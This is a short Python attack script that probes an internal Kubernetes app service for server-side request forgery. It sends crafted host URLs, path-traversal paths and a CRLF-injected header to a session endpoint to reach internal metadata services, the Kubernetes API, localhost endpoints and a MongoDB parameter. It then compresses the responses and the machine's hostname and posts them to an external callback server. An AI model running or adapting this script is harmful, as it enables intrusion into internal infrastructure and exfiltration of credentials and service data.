#!/usr/bin/env python3
import json, os, time, urllib.request, urllib.error, hashlib, gzip
BASE='http://lrs-pygencc-dispatcher-canv2.canv2-sl-app-launcher.svc.cluster.local'
SINK='https://54.209.51.244.sslip.io/callback/snapgpt-ssrf-matrix2-20261106'
CASES=[
 ('ms_getparam','http://lrs-metaserve-01.canv2-sl-app-launcher.svc.cluster.local/get_param?param_key=MONGODB#','x','__mismatch__',None),
 ('ms_getparam_pod','http://lrs-metaserve-01.canv2-sl-app-launcher.svc.cluster.local/get_param?param_key=MONGODB&pod=slserver&params[replica_set]=slserver#','x','__mismatch__',None),
 ('ms_getparam_method','http://lrs-metaserve-01.canv2-sl-app-launcher.svc.cluster.local/get_param?param_key=MONGODB&_method=POST#','x','__mismatch__',None),
 ('ms_getparam_override','http://lrs-metaserve-01.canv2-sl-app-launcher.svc.cluster.local/get_param?param_key=MONGODB#','x','__mismatch__','x\r\nX-HTTP-Method-Override: POST'),
 ('ms_openapi','http://lrs-metaserve-01.canv2-sl-app-launcher.svc.cluster.local','../../../../openapi.json','__mismatch__',None),
 ('ms_health','http://lrs-metaserve-01.canv2-sl-app-launcher.svc.cluster.local','../../../../health','__mismatch__',None),
 ('kube_version','https://kubernetes.default.svc','../../../../version','__mismatch__',None),
 ('kube_ip_version','https://172.20.0.1:443','../../../../version','__mismatch__',None),
 ('kube_http_version','http://172.20.0.1:8080','../../../../version','__mismatch__',None),
 ('dispatcher_llm_health','http://127.0.0.1:8080','../../../../llm/health','__mismatch__',None),
 ('dispatcher_sessions','http://127.0.0.1:8080','../../../../sessions','__mismatch__',None),
 ('dispatcher_health','http://127.0.0.1:8080','../../../../health','__mismatch__',None),
]
O={'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'hostname':os.uname().nodename,'base':BASE,'cases':[]}
for name,host,path,pid,tok in CASES:
 body={'user_id':'snapgpt-ssrf2-'+name+'@armorerlabs.com','host_url':host,'project_path':path,'project_id':pid,'force':True}
 raw=json.dumps(body,separators=(',',':')).encode()
 headers={'Content-Type':'application/json','X-SL-Token':tok or 'x'}
 req=urllib.request.Request(BASE+'/session/init',data=raw,method='POST',headers=headers)
 rec={'name':name,'host_url':host,'project_path':path,'token_mode':'crlf' if tok else 'x'}
 t=time.monotonic()
 try:
  with urllib.request.urlopen(req,timeout=12) as r:
   b=r.read(12000);rec.update(status=r.status,body=b.decode('utf-8','replace'),headers=dict(r.headers))
 except urllib.error.HTTPError as e:
  b=e.read(12000);rec.update(status=e.code,body=b.decode('utf-8','replace'),headers=dict(e.headers))
 except Exception as e: rec['error']=repr(e)
 rec['elapsed']=round(time.monotonic()-t,3);O['cases'].append(rec)
raw=json.dumps(O,sort_keys=True,separators=(',',':')).encode();gz=gzip.compress(raw,9)
try:
 q=urllib.request.Request(SINK,data=gz,method='POST',headers={'Content-Type':'application/gzip','X-Probe':'ssrf-matrix2'})
 with urllib.request.urlopen(q,timeout=20) as r:O['sink']={'status':r.status,'body':r.read(1000).decode('utf-8','replace'),'raw_bytes':len(raw),'gzip_bytes':len(gz),'sha256':hashlib.sha256(raw).hexdigest()}
except Exception as e:O['sink']={'error':repr(e),'raw_bytes':len(raw),'gzip_bytes':len(gz),'sha256':hashlib.sha256(raw).hexdigest()}
print(json.dumps(O['sink'],sort_keys=True))
